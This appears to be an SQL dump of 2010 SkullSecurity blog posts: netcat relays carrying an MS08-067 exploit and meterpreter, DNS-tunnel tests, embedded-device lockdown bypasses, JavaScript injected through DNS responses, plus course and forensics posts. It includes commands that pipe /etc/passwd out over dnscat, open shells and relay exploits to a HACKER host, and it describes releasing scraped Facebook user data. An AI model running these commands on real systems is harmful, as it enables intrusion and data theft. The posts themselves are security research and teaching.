user\'s profile\nThe name of every searchable Facebook user, both unique and by count (perfect for post-processing, datamining, etc)\nProcessed lists, including first names with count, last names with count, potential usernames with count, etc\nThe programs I used to generate everything\n\nSo, there you have it: lots of awesome data from Facebook. Now, I just have to find one more problem with Facebook so I can write \"Revenge of the Facebook Snatchers\" and complete the trilogy. Any suggestions? >:-)\nLimitations\nSo far, I have only indexed the searchable users, not their friends. Getting their friends will be significantly more data to process, and I don\'t have those capabilities right now. I\'d like to tackle that in the future, though, so if anybody has any bandwidth they\'d like to donate, all I need is an ssh account and Nmap installed. \nAn additional limitation is that these are only users whose first characters are from the latin charset. I plan to add non-Latin names in future releases.', '\'Hacking\', \'Passwords\'', 'https://blog.skullsecurity.org/2010/return-of-the-facebook-snatchers');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (56, 'Information Security For College Students', 'Matt Gardenghi', '2010-7-14', 'I\'ve thought about this off and on over the last few years.  Today I noticed that Kees Leune (http://www.leune.org/blog/kees/2010/07/teaching-agai.html) is going to be teaching a class this school year.  He was asking for comments and so here\'s mine....\nI\'d like to see a threefold class system.  The first class would entail an overview of the 10 Domains.  The second would be Offensive Security and the third would be Defensive Security.\nThere is a reason for that ordering.  Without a good understanding of the fundamentals of security (10 domains) the second two classes will have less value.  Understanding the idea of physical security as well as separation of duties and such really support defensive and offensive security.  Defenders are better when they understand the threats.  Therefore, I place Offensive Security before Defensive Security.  But that\'s preference.  You could teach them together and make it a two-part class (firewall defense/offense; Linux offense/defense and so forth).\n\nLet\'s get back to class 1: Information Security Fundamentals.  Here are my general thoughts on how such a class could be arranged if I were to teach it.\nI\'d assign Shaun Harris\' CISSP book.  Each week we would cover the 1 of the 10 domains.  On a MWF schedule, Monday would be the overview of the domain and a discussion of the critical questions that need to be asked about each domain.  Wednesday and Friday would be in depth discussion of the domain.\nBecause this is an overview class, each Monday the student would be required to have read the chapter covering the domain to be discussed that week.  The student would also write a two-page paper explaining the critical point of the domain discussed the week before.\nIn this manner, the goal would be to instill into the student a working understanding about the critical ideas of the domain.\nI wouldn\'t make this a CS only class though.  One struggle IT faces is that the business units often purchase software or services that are poorly designed.  IT is then faced with the prospect and demand of fixing/defending dumb apps.  So, I\'d make this course a business elective.\nBusiness students would get 1-2 credits and attend Mondays only.  They would get the high level overview.  My pie-in-the-sky hope is that it would start to create an environment in which the business teams would ask generic security questions to sales guys and/or see through marketing lies.\nA business student would write their two-page paper for the benefit of an IT staff.  This will hopefully help them improve communication with IT people.  As such the paper would be graded by an CS teacher.\nThe CS student would write their paper explaining the domain to a business person who doesn\'t really understand IT.  That paper would be graded by a business teacher.\nAt least the CS/Business teachers would give a grade and I would give a grade.  Hopefully, (again pie-in-the-sky) this improves ever so slightly the ability to communicate between specialties.\nI might even require students to sign up for SANS alert emails and to find recent articles that discuss pro/con the domains we are discussing.  This idea is to keep students learning to read/research in a lifelong way and to encourage them to learn to see how the domains interact with real life.\nMaybe in the future we can discuss more in depth the other classes, but for now, I\'m leaving this here.  Maybe someone can tweak the general idea and improve it or just use it as is.\nDo you have thoughts?', '\'Default\'', 'https://blog.skullsecurity.org/2010/information-security-for-college-students');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (57, 'Call for testers: nbtool-0.05 and dnscat-0.05', 'Ron Bowes', '2010-7-7', 'Hey all,\nI just released the second alpha build of nbtool (0.05alpha2), and I\'m hoping to get a few testers to give me some feedback before I release 0.05 proper. I\'m pretty happy with the 0.05 release, but it\'s easy for me to miss things as the developer. \nI\'m hoping for people to test:\n\nThrough different DNS servers (requires an authoritative DNS server)\nWith different operating systems (doesn\'t require an authoritative server) -- I\'ve tested it on Slackware 32-bit, Slackware 64-bit, FreeBSD 8 64-bit, and Windows 2003, those or others would be great!\nWith different commandline options (also doesn\'t require authoritative server)\n\n\nFirst off, grab the latest dnscat build from either the nbtool or the dnscat pages (it\'s the same file). Whether you build it from the source tarball, use the svn, or use the compiled versions, it\'s all good and let me know which you choose. \nYou can use the same machine for client/server, or put them on separate machines. Here are the important commands:\n\nStart the server: dnscat --listen\nStart the server that can handle multiple clients: dnscat --listen --multi\nStart a client with an authoritative nameserver: dnscat --domain <yourdomainname>\nStart a client without an authoritative nameserver: dnscat --dns <dnscatserver>\nFinally, check if you have an authoritative server: dnscat --test <yourdomainname>\n\nUse the --help argument to find the different options. Although all the options could use a workout, I\'m particularly interested in how well --exec and --multi function across different operating systems. You can also get a ton more documentation on the wiki page. \nThings you can help me out with:\n\nDoes it compile without warnings? Which OS?\nDoes it run?\nCan the client/server communicate properly?\nDoes running --exec /bin/sh (or --exec cmd.exe) on the client give you a shell on the server\nDoes redirecting a bigger file (for example, dnscat --domain skullseclabs.org < /etc/passwd) work properly?\nDo different options you find with --help work the way they\'re described?\nAny other unexplained weirdness?\n\nFeedback on any or all of those points would be awesome! Also, I\'d love to hear any other feedback, bad news, good news, complaints, compliments, or anything of the sort. Either send me an email (my address is on the right) or leave a comment on this post. \nThanks for helping out!', '\'DNS\', \'Tools\'', 'https://blog.skullsecurity.org/2010/call-for-testers-nbtool-0-05-and-dnscat-0-05');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (58, 'Five Relays and a Patch', 'Ron Bowes', '2010-5-26', 'Hey all,\nWe hired a new pair of co-op students recently. They\'re both in their last academic terms, and are looking for a good challenge and to learn a lot. So, for a challenge, I set up a scenario that forced them to use a series of netcat relays to compromise a target host and bring a meterpreter session back. Here is what the network looked like:\n\nTo describe in text:\n\nThey have already compromised a Web server with a non-root account\nThe Web server has no egress filtering, but full ingress filtering, and they aren’t allowed to install anything (fortunately, it already had Netcat)\nThe target server has both egress and ingress filtering, and is not accessible at all from the Internet, but the Web server can connect to it on 139/445 (which are vulnerable to ms08-067). The target can also connect back to the Web server on any port.\n\nThe challenge was to exploit the target server with ms08-067 and bring a meterpreter session back to the attacker server.\n\nI had expected this would require 3-4 netcat relays, but, after helping them to get this working, we ended up with 5 relays for a variety of reasons, plus a minor patch to Metasploit! Maybe we did it the hard way, and maybe we didn’t need all those relays, but it was fun to set up and satisfying to get working.\nAnyway, I’ll let them explain what they did!\nFive relays and a patch\nThe image below shows the various netcat relays we ended up using, in order of execution.\n\nThe first goal was to find a way to bypass the firewalls.  Metasploit was using default ports 445 for outgoing and 4444 for incoming connections, and since we can\'t connect to either of those ports on the Web Server (WEB), we needed the WEB to establish a connection back to us.  Fortunately WEB can connect to TARGET on port 445, and can receive a connection back on any port. Thus 2 netcats are running on the WEB are:\n nc HACKER 1234 -vv < pipe4 |  nc TARGET 445 -vv > pipe4\nThis command forwards the traffic coming in on port 1234 from the HACKER to TARGET port 445 (Relay #4).\n nc -l -p 4444 -vv < pipe2 | nc HACKER 4442 -vv > pipe2\nThis command listens for the meterpreter session back from TARGET on port 4444 and relays it to HACKER on port 4442 (Relay #2).\nWhy does WEB connect on arbitrary port 1234 instead of connecting to Metasploit\'s port 445? Well, Metasploit doesn\'t listen on that port, it needs to initiate the connection. So we need a netcat relay running on HACKER to listen for connection from Metasploit and connect it with the incoming connection from the WEB (Relay #3):\nnc -l -p 1234 -vv < pipe3 | nc -l -p 445 > pipe3\nAs you might have noticed the WEB is  connecting back on port 4442, not 4444 on which Metasploit is listening (Relay #2). They cannot be connected directly, as WEB will establish connection immediately when it starts and Metasploit will get confused since its waiting on Meterpreter session and fail. So we need a relay listening on port 4442 on the HACKER and connecting it back to Metasploit, right? Well, not that simple.\n nc -l -p 4443 -vv < pipe1 | nc -l -p 4442 -vv > pipe1\nThis command will listen for incoming connection from WEB on port 4442 and relay it to port 4443 when that connection is established (Relay #1). This gives Metasploit time to trigger an exploit and we only establish a final connection to Metasploit  once it did by running a final command:\nnc HACKER 4444 -vv < pipe5 | nc HACKER 4443 -vv > pipe\nThis simply establishes a connection to the relay running on the same computer on port 4443 and sends it to Metasploit on port 4444 (Relay #6).\nThe biggest challenge was getting the timing of the last command right. We needed to activate it after Metasploit starts listening for the reverse_tcp stager but before it sends stage data. If stage data was sent before the entire link was created,the vulnerability would be exploited, but the stage would fail. In order to get the timing right for the final command, a modification to the stager.rb in the lib/msf/core/payload/ folder was necessary. We added a three-second delay after the vulnerability has been triggered and before the stage data was sent in order to give us time to link the netcat relays together for the connection back.\nThis is the patch against the Metaploit version on the Backtrack 4 cd (it\'ll likely fail against the HEAD revision due to a number of changes):\nIndex: stager.rb\r\n===================================================================\r\n--- stager.rb   (revision 8091)\r\n+++ stager.rb   (working copy)\r\n@@ -100,6 +100,9 @@\r\n                                p = (self.stage_prefix || \'\') + p\r\n                        end\r\n\r\n+            print_status(\"Delaying for three seconds (Start your nc relay).\")\r\n+            Kernel.sleep(3)\r\n+\r\n                        print_status(\"Sending stage (#{p.length} bytes)\")\r\n\r\n                        # Send the stage\r\n@@ -164,4 +167,5 @@\r\n        #\r\n        attr_accessor :stage_prefix\nNow that everything should be (theoretically) working, we had to make sure to start netcat relays in the right order to make sure they can establish connections, and we had to wait before executing #6 until #2 received a connection established message. The -vv command is optional for all nc instances except in #2, where they are used to determine when to execute #6. We first start all the listener relays and then start the relays that establish connections. The commands were executed in the order provided\n\nThis command is run on the HACKER:\nnc -l -p 4443 -vv < pipe1 | nc -l -p 4442 -vv > pipe1\nThis command was run on the WEB:\nnc -l -p 4444 -vv < pipe2 | nc HACKER 4442 -vv > pipe2\nHACKER:\nnc -l -p 1234 -vv < pipe3 | nc -l -p 445 > pipe3\nWEB:\nnc HACKER 1234 -vv < pipe4 | nc TARGET 445 -vv > pipe4\nNow that we have a connection to the target we run an exploit:\n./msfcli exploit/windows/smb/ms08_067_netapi \r\n PAYLOAD=windows/meterpreter/reverse_tcp RHOST=HACKER LHOST=WEB E\nLast command is run on HACKER when Relay #2 displays a detected connection:\nnc HACKER 4444 -vv < pipe5 | nc HACKER 4443 -vv > pipe', '\'Hacking\', \'Tools\'', 'https://blog.skullsecurity.org/2010/five-relays-and-a-patch');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (59, 'Defeating expensive lockdowns with cheap shellscripts', 'Ron Bowes', '2010-5-18', 'Recently, I was given the opportunity to work with an embedded Linux OS that was locked down to prevent unauthorized access. I was able to obtain a shell fairly quickly, but then I ran into a number of security mechanisms. Fortunately, I found creative ways to overcome each of them. \nHere\'s the list of the biggest problems I encountered, in the order that I overcame them:\n\nThe user account couldn\'t \'ls\' most folders due to lack of privileges\nProcess management tools (like ps) didn\'t work (thanks to the missing \'ls\')\nThe user account could only write to designated areas, in spite of file permissions\nArchitecture was PowerPC, which I have no experience with\nnetstat, ifconfig, arp, and other tools were disabled\n\n\nI can\'t talk about how I actually obtained a shell, unfortunately, because the nature of the device would be too obvious. But I will say this: despite all their lockdowns, they accidentally left netcat installed. Oops :)\nIf you\'ve been in similar situations and found some other tricks, I\'d like to hear about them!\nImplementing ls\nUnfortunately, I was only able to obtain user access, not root. Despite permissions to the contrary, I couldn\'t run \'ls\' against any system folders:\n$ cd /\r\n$ ls\r\n/bin/ls: cannot open directory .: Permission denied\r\n$ cd /bin\r\n$ ls\r\n/bin/ls: cannot open directory .: Permission denied\r\n$ find /\r\n/\r\n$ find .\r\n.\nAnd so on. I could, however, run ls on /home/user, /tmp, and subfolders thereof. \nAs a side effect, I couldn\'t run the \'ps\' command because it didn\'t have permission to read /proc:\n$ ps\r\nError: can not access /proc.\nBut I\'ll get to that later. \nAfter struggling a little, I was happy to discover that the \'which\' command was enabled! \n$ which ls\r\n/usr/bin/ls\r\n$ which ps\r\n/usr/bin/ps\nGreat luck! I wrote a script on my personal laptop that would find every executable:\n\r\n# find / -perm /0111 -type f |       # Find all executable files\r\n  grep -v \'^/home\'           |       # Remove files stored on /home\r\n  grep -v \'\\.so$\'            |       # Remove libraries\r\n  grep -v \'\\.a$\'             |       # Remove libraries\r\n  grep -v \'\\.so\\.\'           |       # Remove libraries\r\n  sed \'s|^.*/||\'                     # Remove the path\r\n\nAnd redirected the output from this script to a file. Then, I uploaded the file to the device using netcat and, after adding the sbin folders to the $PATH, I ran the following command:\n$ export PATH=/sbin:/usr/sbin:/usr/local/sbin:$PATH\r\n$ cat my-programs.txt | xargs which | sort | uniq > installed-programs.txt\nWhich returned a list that looked like:\n$ head installed-programs.txt\r\nbin/arch\r\n/bin/bzip2recover\r\n/bin/cpio\r\n/bin/dmesg\r\n/bin/fusermount\r\n/bin/hostname\r\n/bin/ipmask\r\n/bin/kill\r\n/bin/killall\r\n/bin/login\r\n\nAnd finally, if you want more information:\n$ cat installed-programs.txt | xargs ls -l > installed-programs-full.txt\nWhich, of course, gives you this type of output:\n$ head installed-programs-full\r\n-rwxr-xr-x 1 root   root        2896 2008-03-31 16:56 /bin/arch\r\n-rwxr-xr-x 1 root   root        7696 2008-04-07 00:42 /bin/bzip2recover\r\n-rwxr-xr-x 1 root   root       52800 2007-04-07 12:04 /bin/cpio\r\n-rwxr-xr-x 1 root   root        4504 2008-03-31 16:56 /bin/dmesg\r\n-rwsr-xr-x 1 root   root       19836 2008-03-07 19:52 /bin/fusermount\r\n-rwxr-xr-x 1 root   root        9148 2008-03-31 23:10 /bin/hostname\r\n-rwxr-xr-x 1 root   root        3580 2008-03-31 23:10 /bin/ipmask\r\n-rwxr-xr-x 1 root   root        8480 2008-03-31 16:56 /bin/kill\r\n-rwxr-xr-x 1 root   root       14424 2006-12-19 18:07 /bin/killall\r\n-rwxr-xr-x 1 root   root       44692 2008-03-24 15:11 /bin/login\r\n\nSuccess! Now I have a pretty good idea of which programs are installed. I could collect samples from a wider variety of machines than just my laptop, potentially turning up more interesting applications, but I found that just the output from a single Linux system was actually a good enough sample to work with. \nRemember, with the full \'ls -l\' output, keep your eye out for \'s\' in the permissions. ;)\nImplementing ps\nAs I mentioned earlier, the ps command fails spectacularly when you can\'t ls folders:\n$ ps\r\nError: can not access /proc.\nThe first thing I tried was an experimental \'cat\', which worked nicely:\n$ cat /proc/1/status\r\nName:   init\r\nState:  S (sleeping)\r\n[...]\r\n\nWhich tells me that the /proc filesystem is there, and that I have access to their accounting information. The only reason I can\'t list them is because \'ls /proc\' (or the equivalent thereof) is failing. An investigation also told me that /proc/cpuinfo and /proc/meminfo also exist, which were helpful. So, I threw together a quick script to bruteforce the list:\nfor i in `seq 1 100000`; do    # Take the first 100,000 PIDs \r\n                               #(experimentally determined)\r\n  if [ -f /proc/$i/status ]; then   # Check if the status file exists\r\n    CMDLINE=`cat /proc/$i/cmdline | # Read the commandline\r\n              sed \'s/|//g\' |        # Remove any pipes (will break things)\r\n              sed \"s/\\x00/ /g\"`;    # Replace null with space\r\n    cat /proc/$i/status |           # Get the process details\r\n      grep \'Name:\'      |           # We only want the name\r\n      cut -b7-          |           # Remove the prefix \"Name:  \"\r\n      sed \"s|$| ($CMDLINE)|\";       # Add the commandline to the end\r\n  fi; \r\ndone\r\n\nThe output for this will look like:\ninit (init [3]        )\r\nkthreadd ()\r\n[...]\r\nudevd (/sbin/udevd --daemon )\r\nsyslogd (/usr/sbin/syslogd )\r\nklogd (/usr/sbin/klogd -c 3 -x )\r\n\nSo now I have a pretty good list of the running processes. Win!\nAnother option would be to write a patch for procps that implements a bruteforce listing, but that was beyond what I really wanted to do. \nWriting to protected areas\nThis one, I want to be careful with. The reason is, I don\'t understand what was happening, or why. \nIn any case, in spite of permissions, I couldn\'t write to most folders, including /home/user. How they locked it down, I don\'t know, but I can\'t touch, cat, grep, etc them. \nAfter some poking, though, I discovered that I could rm files and read/write them using redirection. So, oddly, it would look like this:\n$ touch test\r\ntouch: cannot touch `test\': Permission denied\r\n$ echo \"TEST DATA\" > test\r\n$ cat test\r\ncat: test: Permission denied\r\n$ cat < test\r\nTEST DATA\r\n$ mv test test2\r\nmv: cannot move `test\' to `test2\': Permission denied\r\n$ cat < test > test2\r\n$ rm test\r\n\nThat\'s all I can really say about that one. This bug let me write to some sensitive folders and modify settings I shouldn\'t have been able to. \nPowerPC\nThe architecture of this device turned out to be PowerPC, which presented an interesting challenge. I\'ve never done any cross compilation before, and I didn\'t even know where to start. So, I was going to skip it altogether. \nThen, this past weekend, my friend brought over a device called WD HD Live. After installing Linux on it, I discovered that, like our old friend WRT54g, it had a MIPS core. So I took a couple hours out and learned how to cross compile for MIPS. \nBy Monday, I knew everything one or two things about cross compiliation, and was ready to get started! I downloaded Hobbit\'s Netcat from Debian and compiled it with the crosstool commands (note: I have *no* idea whether or not this is the right way to cross compile; all I know is, it worked :) ):\n$ export PATH=/opt/crosstool/gcc-4.1.0-glibc-2.3.6/powerpc-860-linux-gnu/powerpc-860-linux-gnu/bin:$PATH\r\n$ wget http://ftp.de.debian.org/debian/pool/main/n/netcat/netcat_1.10.orig.tar.gz\r\n$ wget http://ftp.de.debian.org/debian/pool/main/n/netcat/netcat_1.10-38.diff.gz\r\n$ tar -xvvzf netcat_1.10.orig.tar.gz\r\n$ gunzip -v netcat_1.10-38.diff.gz\r\n$ patch -p0 < netcat_1.10-38.diff\r\n$ patch -p0 < netcat-1.10.orig/debian/patches/glibc-resolv-h.patch\r\n$ cd netcat-1.10.orig\r\n$ make linux CC=gcc\nI successfully copied the new netcat to the device and ran it, to prove that the cross compile worked. \nObviously, using netcat to copy netcat to the device makes very little sense. But the point was to prove that cross compilation works, not that I could do something interesting with it. \nNo networking tools\nFinally, I was dismayed to find out that netstat, ifconfig, arp, and others all returned a \"Permission denied\" error when I tried to run them. How am I supposed to figure out the system state without them?\nFortunately, none of them require setuid to run, so I downloaded the latest net-tools package, compiled it with the PowerPC toolchain, uploaded them with netcat, and tried them out:\n$ ./netstat-ron -an\r\nActive Internet connections (servers and established)\r\nProto Recv-Q Send-Q Local Address           Foreign Address         State\r\ntcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN\r\ntcp        0      0 192.168.155.11:39002    192.168.155.105:3306     TIME_WAIT\r\ntcp        0      0 192.168.155.11:41992    192.168.155.105:3306     ESTABLISHED\r\ntcp        0      0 192.168.155.11:37288    192.168.155.105:3306     ESTABLISHED\r\ntcp        0      0 192.168.155.11:38736    192.168.155.105:3306     ESTABLISHED\r\ntcp        0      0 192.168.155.11:38652    192.168.155.105:3306     ESTABLISHED\r\n\n$ ./ifconfig-ron lo\r\nlo        Link encap:Local Loopback\r\n          inet addr:127.0.0.1  Mask:255.0.0.0\r\n          inet6 addr: ::1/128 Scope:Host\r\n          UP LOOPBACK RUNNING  MTU:16436  Metric:1\r\n          RX packets:1285090 errors:0 dropped:0 overruns:0 frame:0\r\n          TX packets:1285090 errors:0 dropped:0 overruns:0 carrier:0\r\n          collisions:0 txqueuelen:0\r\n          RX bytes:130762797 (124.7 MiB)  TX bytes:130762797 (124.7 MiB)\r\n\n$ ./arp-ron\r\nAddress                  HWtype  HWaddress           Flags Mask            Iface\r\n192.168.155.1            ether   00:0C:29:7E:21:63   C                     eth0\r\n192.168.155.105          ether   00:50:56:C0:00:00   C                     eth0\r\n192.168.155.144          ether   00:0C:29:42:B7:1B   C                     eth0\r\n\nDone!\nConclusion\nSo, I managed to overcome the lockdown on the embedded device. Once I had shell I could do pretty anything I could normally do, in spite of the attempted lockdown. Therefore, I concluded that, in its current state, the lockdown was nearly useless. \nI plan to work with the vendor, of course, to help them resolve these issues. \nNow, your turn! Have you ever had to use makeshift tools on a locked down system? Any interesting stories?', '\'Hacking\'', 'https://blog.skullsecurity.org/2010/defeating-expensive-lockdowns-with-cheap-shellscripts');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (60, 'Metasploit Express Beta – First Look', 'Matt Gardenghi', '2010-5-11', 'This post was written by Matt Gardenghi\nThis is just initial impressions of a beta product.\nI\'ve been playing with this for about a week now in an internal network.  I have a dedicated box running Ubuntu 10.04 and Metasploit Express.  I\'ve noticed that Express loves CPU time but is much less caring about RAM.  It\'s also not multi-threaded.  I\'d recommend a dual core box as Express will peg one core.  If you want to do anything else while Express is running, you need two cores. Still, Express does not require an expensive RAM build out. I\'ve run top plenty of times and seen that the RAM usage remains low even when I\'ve had 170+ shells running.  :-p  Hopefully, we\'ll get multi-threading down the road.  When multiple tasks are running simultaneously, this lack of multi-threading becomes an issue.  Everything slows to a crawl.\n\nAnyway speed issues aside, Express is very slick.  The interface is clean and minimalistic.  At first, things are a little to minimalistic.  It took me a while to realize that I had tasks running; they appeared to start and finish, but had actually moved to the task list.  Express gives subtle hints about tasks running, sessions opened, and updated system information as seen in this screenshot (the blue circles with numbers).\n\nThere are a lot of features to talk about, but let me simplify it this way: As long as you are willing to run generic scans, exploits, etc, Express will simplify your pentesting.\nWait, don\'t go yet.  You can still do quite a bit with this.  (And from my communication with the developers, we will eventually receive the ability to tweak the defaults.) Let\'s suppose you want to see if anyone is running default usernames and passwords across a large organization.  Express will do that (and give you shell if possible).  Express handles large groups of repetitive tasks well.\nDown the road, it would be nice if users can change the defaults if they see a need (maybe your AV picks up this particular default).  Still, as a general rule, the defaults are set because they work in most instances.  You may never need to change anything. (You can run specific modules from the Metasploit kit.)\nThere are times when the more advanced Metasploit features are needed.  These can be accessed from the console if you tell Metasploit to use the same Postgres DB.  I haven\'t got that working yet, probably user error.\nAnyway, having played with this for a while now, I can\'t see it replacing my usual toolset.  I\'m seldom given an internal IP to test and am seldom allowed to perform social engineering.  So, I\'m not certain how much use this will be to me as my access usually starts with a website flaw (file upload, poor password) or router misconfiguration. Now if I could set up multi/handler, execute a payload (social engineering, file upload flaw or such), and then pivot into the organization..., well that would make a BIG difference.\nI can see this being worth the price for anyone on an internal security team.  At the least, this will grab all the low hanging fruit and then will grant you the information you need to perform more in depth testing.\nThis is a good tool for those network admins who also wear the security hat.  They can run NeXpose or Nessus across their environment, import it into Express and demonstrate the need to fix these holes.\nCheck it out.  And once we leave beta, I\'m hoping to write a full review about the various features.  Questions?  Drop me a line or post a comment and I\'ll see what I can answer for you.\nThere is a high likelihood that you will find this tool useful in your security testing work.', '\'Hacking\', \'Tools\'', 'https://blog.skullsecurity.org/2010/metasploit-express-beta-first-look');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (61, 'Confidential Information in the Cloud', 'Matt Gardenghi', '2010-5-5', 'This is another special blog written by Matt Gardenghi! \nMy boss passed around a document about database security in the cloud.  It raised issues about proper monitoring of the DB, but offered no solutions.\nThis got me thinking.  I hate it when that happens.  Its like an automatic \"boss button\" that I can\'t switch off.  /gah\nFor the sake of argument, let\'s assume we are discussing VMs hosted on some provider\'s (Amazon) VMWare ESX cluster.  This could really apply to any VM on any company\'s specific VM host, but VMWare is big, popular, and a good basis to work from.  Let\'s say, some marketing exec bought a package that would hold data on a machine in the cloud.  (You may shoot him later; right now, you have to deal with the issues of integration into your secure environment.)\n\nNow let\'s suppose that you do not have enough machines to warrant a private cluster.  You will be sharing a cluster with unknown parties.  Fun!  (Ant-acid is found in aisle 5.)\nAfter reading this document, my mind immediately ran to the story of Kevin Mitnick\'s hacked website.  You may recall that the headlines proclaimed that Mitnick was hacked, when that is only true in the strictest sense.  In reality, it was a shared host, and one of the other sites was running old code and was hacked.  That hack granted the attacker access to modify Mitnick\'s site.\nOK, but are you really at risk this way?  We\'re talking about VMs here not shared hosting on a poorly configured LAMP stack.   But, surely you\'ve heard of Guest -> Host exploits?  And since this is publicly obtainable software, one *could* setup a duplicate environment and fuzz away at it....  (Not that any entity would do that, of course.)\nSo theoretically, one of the other unknown/untrusted Guests could use a zero day exploit to compromise the Host.  Then they could compromise all of the co-located Guests on the box.  Cheery thought....  How would you know?  Since they are essentially performing a \"man in the middle,\" the attacker could just watch your traffic and never touch your machine.  All of those techniques for modifying data on the wire come trudging depressingly back to mind.  You couldn\'t trust the data coming from the user or going to the user.\nFurther, if the ESX host is compromised, every machine that VMotioned over to it could be compromised.  Every machine that VMotioned off could then run the zero day against a new host.  This would get an entire cluster and possibly migrate to other clusters (though much less likely).\nNow one might ask \"how\" a malicious user/competitor/etc would locate your server in Amazon\'s cloud and target your machine.  Cue stage right: a paper on doing that very thing (pdf).\nSo now we are looking at 1) an attacker can find your machine, 2) an attacker could instigate Guest -> Host exploits.  Are you still certain you want to put your data in the cloud?  Ugh.  I can\'t think of one good reason to do this on a public cloud hosting service.\nI know that this is more of a theoretical post and not like Ron\'s usual posts detailing specific exploitation or research, but I\'m interested in your comments.  Am I off base in this reasoning (has happened once or twice before - according to my wife anyway).  What are your thoughts?  Is it worse than I suspect or am I over-reacting?', '\'Hacking\'', 'https://blog.skullsecurity.org/2010/confidential-information-in-the-cloud');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (62, 'Stuffing Javascript into DNS names', 'Ron Bowes', '2010-4-20', 'Greetings! \nToday seemed like a fun day to write about a really cool vector for cross-site scripting I found. In my testing, this attack is pretty specific and, in some ways, useless, but I strongly suspect that, with resources I don\'t have access to, this can trigger stored cross-site scripting in some pretty nasty places. But I\'ll get to that! \nInterestingly enough, between the time that I wrote this blog/tool and published it, nCircle researchers have said almost the same thing (paper (pdf)). The major difference is, I released a tool to do it and demonstrate actual examples.\n\ndnsxss\nIf you\'ve installed nbtool, you may have noticed that, among other programs it comes with, one of them is called dnsxss. Take a look at the wiki page for more information, but what it does is, essentially, respond to DNS requests for CNAME, MX, TXT, and NS records with Javascript code. Unless you want some specific code, all you have to do is run it:\n# dnsxss\r\nListening for requests on 0.0.0.0:53\r\nWill response to queries with: \r\n<script/src=\'http://www.skullsecurity.org/test-js.js\'></script>\r\n\nPass -h or --help for a list of arguments. \nNow, an observant reader will realize that this isn\'t valid HTML. Unfortunately, as far as I can tell, there\'s no way to send a space through DNS, so you have to come up with some space-free code. The best I could find was replacing spaces with a \'/\', which will work on Firefox but not IE (I haven\'t tested anything else). If anybody can think of a better way to write HTML without spaces, let me know. The next best solution is using the TXT query, which DOES allow spaces. dnsxss will reply to TXT queries with well formed Javascript. \nFor what it\'s worth, dnsxss will answer A or AAAA requests with localhost (127.0.0.1 or ::1) -- if somebody does a lookup, they\'ll get an odd answer that won\'t immediately lead back to you. \nLet\'s break stuff!\nSo, what can you do with this?\nWell, fortunately (or unfortunately? depends who you are), most sites don\'t echo back DNS records. But, some do. I picked the first three sites from a Google query and tested them out. All three were vulnerable. And I very much doubt that any programmers even *consider* filtering DNS responses. I mean, who expects DNS responses to contain HTML? \nAnd, furthermore, if I can sneak HTML code into pretty much any site that looks up DNS names due to lack of filtering, how about SQL injection? If the response is inserted into the database without filtering for SQL characters, which I would bet they are on at least some sites, you now have an avenue for SQL injection! And, better yet, there\'s a decent chance that the requests won\'t be logged because a) it\'s coming through a backchannel so it\'s not going to be in their Web server logs, b) the statements containing SQL injection won\'t be inserted to your logging table (since they wouldn\'t be valid queries), and c) you can turn off the DNS server whenever you want, and no trace will be left that you were ever doing it (except short-lived caches). \nAs I mentioned earlier, I took the first three sites from a google query I crafted, and all three were vulnerable. I emailed the administrators of all three sites, and two of them replied thanking me. Both told me that it was a really interesting vector, and that they would fix their sites as soon as possible. The third I haven\'t heard back from. But the point is, on three random sites, none had even considered implementing any defenses.\nLet\'s take a look at the examples! But first, here are some notes on them:\n\nThe examples use skullseclabs.org, which is the domain I use for all my testing -- if you plan on testing these yourself, you\'ll have to register your own domain\nThe examples use \"/* */\" to conceal the space, but I realized later that a single \"/\" works just as well\n\nSo, without further ado, here are some screenshots of the sites. I anonymized them a little, though a clever attacker could likely Google hack them. \nSite 1\nThe form:\n\nThe result:\n\nThe source:\n\nSite 2\nThe form:\n\nThe result:\n\nThe source:\n\nSite 3\nThe form:\n\nThe result:\n\nThe source:\n\nSo there we go...\nThree sites, none of which filter out my cross-site scripting attempts. Fun!\nWeaponization\nThe problem is, this only affects a small percentage of sites -- those that will look up domains and display them for you. How can this be used against more targets?\nWell, I have two ideas:\n\nAs I mentioned earlier, I\'d bet money that there are other forms of attacks through these avenues -- I\'d be surprised if SQL injection didn\'t exist\nCan you stuff javascript into reverse DNS entries?\n\nThe second point, I suspect, is where we\'re going to have fun. I can think of countless security devices, from firewalls to vulnerability management tools to proxy servers, with Web interfaces that display reverse DNS records. Not to mention tools where administrators are shown reverse lookups -- forums, for example. Another avenue is logfiles, which are normally visible to administrators. \nIn all of these cases, if you can stuff Javascript into reverse DNS lookups, you will likely find some very interesting vulnerabilities. Plus, you can instantly see when somebody hits one, and, more often than not, you can clean up your tracks quite well. \nI don\'t have access to any domains where I control the reverse DNS records, but if anybody does I\'d love to test this out!', '\'DNS\', \'Hacking\', \'Tools\'', 'https://blog.skullsecurity.org/2010/stuffing-javascript-into-dns-names');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (63, 'Determine Windows version from offline image', 'Ron Bowes', '2010-4-8', 'I am not a forensics expert, nor do I play one on TV. I do, however, play one at work from time to time and I own some of the key tools: a magnifying glass and a 10baseT hub. Oh, and a Sherlock Holmes hat -- that\'s the key. Unfortunately, these weren\'t much help when I was handed a pile of drives and was asked to find out which version of Windows they had been running. I wasn\'t allowed to boot them, and I couldn\'t really find the full answer of how to get the version after a lot of googling, so I figured it out the hard way. Hopefully I can save you guys some time by explaining it in detail. \nAnd if there\'s a better way, which I\'m sure there is, please let me know. I don\'t doubt that I did this the hard way -- that\'s kinda my thing. \nThe order of events is, basically:\n\nStep 1: Copy the system\'s registry hive to your analysis system\nStep 2: Mount the registry hive in regedit.exe\nStep 3: Navigate to the OS version in regedit.exe\nStep 4: Unmount the registry hive.\n\nIf you know how to do all that, then thanks for reading! Check back Tuesday for a brand new blog posting! I have an interesting blog that combines DNS and 